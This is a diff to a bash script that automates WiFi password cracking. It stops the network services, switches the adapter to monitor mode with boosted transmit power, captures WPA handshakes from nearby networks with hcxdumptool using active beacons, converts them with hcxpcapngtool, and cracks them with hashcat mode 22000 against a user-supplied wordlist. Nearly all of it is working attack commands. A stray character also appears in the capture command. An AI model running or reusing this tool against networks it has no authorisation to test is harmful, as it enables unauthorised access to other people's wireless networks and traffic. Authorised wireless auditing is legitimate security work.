@@ -105,16 +105,23 @@ echo ${NC}
 systemctl stop NetworkManager.service
 systemctl stop wpa_supplicant.service
 
+# Set the adapter as monitor mode
+ip link set $INTERFACE down
+iw dev $INTERFACE set type monitor
+ip link set $INTERFACE up
+iw $INTERFACE set txpower fixed 3000
+
 echo
 box "${YELLOW}[-] ${GREEN} Let's dump of the wifi networks. Press ${YELLOW}CTRL-C${GREEN} when you have finished"
-now=$(date +"%Y-%m-%d")
-hcxdumptool -i $INTERFACE ù -o $now.pcapng --active_beacon --enable_status=15
+now=$(date +"%Y-%m-%d-%H:%M")
+mkdir $now-capture
+hcxdumptool -i $INTERFACE ù -o $now-capture/$now.pcapng --active_beacon --enable_status=15
 
 echo
 box "${YELLOW}[-] ${GREEN} Let's decypt the captured pcap file"
-hcxpcapngtool -o $now.hc22000 -E essidlist$now $now.pcapng
+hcxpcapngtool -o $now-capture/$now.hc22000 -E $now-capture/essidlist$now $now-capture/$now.pcapng
 
-if [ -f $now.hc22000 ]; then
+if [ -f $now-capture/$now.hc22000 ]; then
 	echo
 	box "${YELLOW}[-] ${GREEN} Enter the absolute path of the wordlist:"
 	read -r -p "${ITALIC_BLUE}--> ${NC}" WORDLISTPATH
@@ -141,8 +148,11 @@ if [ -f $now.hc22000 ]; then
 		esac 
 	done #End sure while (y/n)
 		
+# TODO: Do you want to add some rules?
+#	If yes enter the absolute path of the rules file
+
 	box "${YELLOW}[-] ${GREEN} Crack the captured hc22000 handshake"
-	hashcat -m 22000 hash.hc22000 $WORDLISTPATH 
+	hashcat -m 22000 $now-capture/$now.hc22000 $WORDLISTPATH 
 	echo
 
 	box "${YELLOW}[-] ${GREEN} DONE!"
